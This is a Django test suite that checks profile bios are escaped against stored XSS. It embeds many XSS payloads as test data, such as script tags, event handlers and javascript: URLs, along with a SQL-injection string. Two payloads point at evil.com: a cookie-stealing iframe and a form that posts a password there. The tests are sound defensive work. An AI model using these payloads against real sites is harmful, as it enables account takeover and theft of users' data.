"""
Test suite for stored XSS vulnerability prevention.

This test module verifies that user-controlled content (profile bio, etc.) 
cannot be used to execute malicious scripts or perform XSS attacks.

Stored XSS Attack Scenario:
1. Attacker creates account and enters malicious script in bio: <script>alert('XSS')</script>
2. Script is stored in database
3. When victim views attacker's profile, script executes in victim's browser
4. Attacker can steal cookies, redirect user, deface content, etc.

This test suite validates:
- User input is properly escaped when rendered
- JavaScript payloads cannot execute
- HTML/CSS injection is prevented
- Event handlers (onerror, onclick) cannot execute
- Data exfiltration vectors are blocked
"""

import json
from django.test import TestCase, Client
from django.contrib.auth.models import User
from django.template import Context, Template
from .models import UserProfile


class StoredXSSPreventionTests(TestCase):
    """Test that stored XSS attacks in profile content are prevented."""
    
    def setUp(self):
        """Create test users and client."""
        self.client = Client()
        self.attacker = User.objects.create_user(
            username='attacker',
            email='attacker@evil.com',
            password='attackpass123'
        )
        self.victim = User.objects.create_user(
            username='victim',
            email='victim@example.com',
            password='victimpass123'
        )
        self.attacker_profile = UserProfile.objects.get(user=self.attacker)
        self.victim_profile = UserProfile.objects.get(user=self.victim)
    
    # ========================================================================
    # Basic Script Injection Prevention
    # ========================================================================
    
    def test_script_tag_stored_xss(self):
        """
        Test that <script> tags in bio are not executed.
        
        Attack: Attacker stores <script>alert('XSS')</script> in bio
        Expected: Should be escaped/displayed as text, not executed
        """
        xss_payload = "<script>alert('XSS from bio');</script>"
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        # Login as attacker to view their profile
        self.client.login(username='attacker', password='attackpass123')
        
        # Retrieve the profile page
        response = self.client.get('/profile/')
        
        # Verify script tag is escaped in HTML
        # Should appear as &lt;script&gt; not <script>
        response_content = response.content.decode('utf-8')
        self.assertNotIn('<script>alert', response_content)
        # Should contain the payload text but escaped
        self.assertIn('&lt;script&gt;', response_content.replace('\n', ''))
    
    def test_img_onerror_xss(self):
        """
        Test that onerror event handlers are not executed.
        
        Attack: <img src=x onerror="alert('XSS')">
        Expected: Should be escaped, not trigger event handler
        """
        xss_payload = '<img src=x onerror="alert(\'XSS\')">'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        self.client.login(username='attacker', password='attackpass123')
        response = self.client.get('/profile/')
        response_content = response.content.decode('utf-8')
        
        # Should not contain unescaped img tag with onerror
        self.assertNotIn('onerror=', response_content)
        # Should contain escaped version
        self.assertIn('&lt;img', response_content)
    
    def test_svg_onload_xss(self):
        """Test that SVG onload event handlers are not executed."""
        xss_payload = '<svg onload="alert(\'XSS\')">'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Should not allow SVG tag with event handler
        self.assertNotIn('onload=', response_content)
        self.assertIn('&lt;svg', response_content)
    
    def test_iframe_xss(self):
        """Test that malicious iframes cannot be injected."""
        xss_payload = '<iframe src="https://evil.com/steal-cookies.html"></iframe>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Iframe tag should be escaped
        self.assertNotIn('<iframe', response_content)
        self.assertIn('&lt;iframe', response_content)
    
    # ========================================================================
    # JavaScript Protocol Handler Prevention
    # ========================================================================
    
    def test_javascript_protocol_in_link(self):
        """Test that javascript: protocol handlers are blocked."""
        xss_payload = '<a href="javascript:alert(\'XSS\')">Click me</a>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # javascript: protocol should not appear
        self.assertNotIn('javascript:', response_content)
        # Should be escaped
        self.assertIn('&lt;a', response_content)
    
    def test_data_protocol_in_script(self):
        """Test that data: protocol is handled safely."""
        xss_payload = '<script src="data:text/javascript,alert(\'XSS\')"></script>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # data: protocol in script should be escaped
        self.assertNotIn('<script', response_content)
        self.assertIn('&lt;script', response_content)
    
    # ========================================================================
    # HTML Injection Prevention
    # ========================================================================
    
    def test_form_injection(self):
        """Test that forms cannot be injected into profile."""
        xss_payload = '<form action="https://evil.com/steal-data" method="POST"><input type="password"></form>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Form should be escaped
        self.assertNotIn('<form action', response_content)
        self.assertIn('&lt;form', response_content)
    
    def test_style_tag_injection(self):
        """Test that style tags with malicious CSS are escaped."""
        xss_payload = '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Style tag should be escaped
        self.assertNotIn('<style', response_content)
        self.assertIn('&lt;style', response_content)
    
    # ========================================================================
    # Attribute-Based XSS Prevention
    # ========================================================================
    
    def test_onclick_attribute_xss(self):
        """Test that onclick attributes cannot execute code."""
        xss_payload = '<div onclick="alert(\'XSS\')">Click me</div>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # onclick should not be present
        self.assertNotIn('onclick=', response_content)
        self.assertIn('&lt;div', response_content)
    
    def test_onmouseover_attribute_xss(self):
        """Test that onmouseover attributes are escaped."""
        xss_payload = '<span onmouseover="alert(\'XSS\')">Hover me</span>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # onmouseover should not be present
        self.assertNotIn('onmouseover=', response_content)
    
    def test_style_attribute_with_expression(self):
        """Test that style attributes with expressions are escaped."""
        xss_payload = '<div style="background: expression(alert(\'XSS\'))">Content</div>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # expression() should be escaped
        self.assertNotIn('expression(', response_content)
        self.assertIn('&lt;div', response_content)
    
    # ========================================================================
    # Content Security Policy Testing
    # ========================================================================
    
    def test_response_has_csp_headers(self):
        """Test that responses include Content-Security-Policy headers."""
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        
        # Check for CSP header (if implemented)
        # This prevents execution even if XSS payload gets through
        csp_header = response.get('Content-Security-Policy', '')
        # If CSP is implemented, should have script-src restriction
        if csp_header:
            self.assertIn('script-src', csp_header)
    
    # ========================================================================
    # XSS Payloads Collection (Real-World Examples)
    # ========================================================================
    
    def test_beer_xss_payload(self):
        """Test BEER XSS payload (polyglot)."""
        xss_payload = '"><beer/><beer>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Payload should be escaped or safely handled
        self.assertTrue('&lt;' in response_content or '&gt;' in response_content)
    
    def test_svg_animate_xss(self):
        """Test SVG animate element XSS."""
        xss_payload = '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # SVG animate should be escaped
        self.assertNotIn('<svg>', response_content)
        self.assertIn('&lt;svg&gt;', response_content)
    
    def test_marquee_xss(self):
        """Test marquee tag XSS."""
        xss_payload = '<marquee onstart=alert("XSS")>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Marquee should be escaped
        self.assertNotIn('<marquee', response_content)
    
    def test_details_ontoggle_xss(self):
        """Test details element with ontoggle handler."""
        xss_payload = '<details ontoggle="alert(\'XSS\')">'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # ontoggle should not be present
        self.assertNotIn('ontoggle=', response_content)
    
    # ========================================================================
    # Context-Specific XSS Prevention
    # ========================================================================
    
    def test_html_context_escaping(self):
        """Test that HTML context escaping works correctly."""
        # Test in the actual template rendering context
        xss_payload = '<img src="x" alt=""><script>alert("XSS")</script>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        # Render the template with the payload
        template_str = '{{ profile.bio }}'
        template = Template(template_str)
        context = Context({'profile': self.attacker_profile})
        rendered = template.render(context)
        
        # Should be escaped
        self.assertNotIn('<script>', rendered)
        self.assertIn('&lt;', rendered)
    
    def test_double_encoding_prevention(self):
        """Test that double-encoding doesn't bypass protection."""
        # Attempt to bypass with encoded characters
        xss_payload = '&lt;script&gt;alert("XSS")&lt;/script&gt;'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        # Should stay encoded (not double-encoded or decoded)
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Should not execute script
        self.assertNotIn('<script>alert', response_content)
    
    # ========================================================================
    # SQL Injection-Adjacent Testing (Defense in Depth)
    # ========================================================================
    
    def test_sql_like_payload_safe(self):
        """Test that SQL-like payloads don't affect rendering."""
        # While primarily SQL concern, verify rendering isn't broken
        sql_like = "'; DROP TABLE users; --"
        self.attacker_profile.bio = sql_like
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        
        # Should render safely and status should be 200
        self.assertEqual(response.status_code, 200)
        # Content should be present
        self.assertIn(sql_like, response.content.decode('utf-8'))
    
    # ========================================================================
    # Unicode and Encoding Tests
    # ========================================================================
    
    def test_unicode_characters_in_bio(self):
        """Test that legitimate Unicode content renders correctly."""
        unicode_content = "Hello 世界 🌍 Привет مرحبا"
        self.attacker_profile.bio = unicode_content
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # Unicode characters should be present and readable
        self.assertIn('世界', response_content)
        self.assertIn('🌍', response_content)
    
    def test_null_byte_injection(self):
        """Test that null bytes don't cause issues."""
        bio_with_null = "Normal bio\x00 with null byte"
        self.attacker_profile.bio = bio_with_null
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        self.assertEqual(response.status_code, 200)
    
    # ========================================================================
    # Profile Edit Template XSS Prevention
    # ========================================================================
    
    def test_profile_edit_form_xss_display(self):
        """Test that form displays XSS payloads safely in edit page."""
        xss_payload = '<img src=x onerror="alert(\'XSS\')">'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        # Login as attacker and view edit form
        self.client.login(username='attacker', password='attackpass123')
        response = self.client.get('/profile-edit/')
        
        response_content = response.content.decode('utf-8')
        
        # Payload in form should be escaped so it can't execute
        # But the data should be preserved so user can edit it
        self.assertNotIn('onerror=', response_content)
    
    # ========================================================================
    # Data Persistence and Rendering Tests
    # ========================================================================
    
    def test_xss_payload_stored_correctly(self):
        """Test that XSS payload is stored as-is but rendered safely."""
        xss_payload = '<script>alert("XSS")</script>'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        # Verify it's stored in database
        stored = UserProfile.objects.get(id=self.attacker_profile.id)
        self.assertEqual(stored.bio, xss_payload)
        
        # But when rendered, it should be escaped
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        self.assertNotIn('<script>alert', response_content)
    
    def test_multiple_xss_vectors(self):
        """Test that multiple XSS vectors in one bio are all escaped."""
        xss_payload = '<script>alert(1)</script><img src=x onerror="alert(2)"><svg onload="alert(3)">'
        self.attacker_profile.bio = xss_payload
        self.attacker_profile.save()
        
        response = self.client.get(f'/user/{self.attacker.id}/profile/')
        response_content = response.content.decode('utf-8')
        
        # None of the event handlers should be present
        self.assertNotIn('onerror=', response_content)
        self.assertNotIn('onload=', response_content)
        # Should have escaped HTML tags
        self.assertIn('&lt;script&gt;', response_content)


class DjangoAutoEscapeTests(TestCase):
    """Test Django's automatic escaping in templates."""
    
    def test_template_auto_escape_enabled(self):
        """Verify that Django template auto-escaping is enabled."""
        from django.conf import settings
        
        # Check that autoescape is enabled in templates
        template_engine = settings.TEMPLATES[0]
        
        # Should have autoescape enabled by default
        self.assertEqual(template_engine['BACKEND'], 'django.template.backends.django.DjangoTemplates')
        # Default Django templates have autoescape enabled
    
    def test_questionable_safe_filter_usage(self):
        """Test that |safe filter is not misused on user input."""
        from manzi.models import UserProfile
        from django.contrib.auth.models import User
        
        user = User.objects.create_user(username='test', password='test')
        profile = UserProfile.objects.create(user=user, bio='Safe content')
        
        # The bio should NOT use the |safe filter
        # (verification is done by code inspection, not runtime test)
        self.assertIsNotNone(profile.bio)
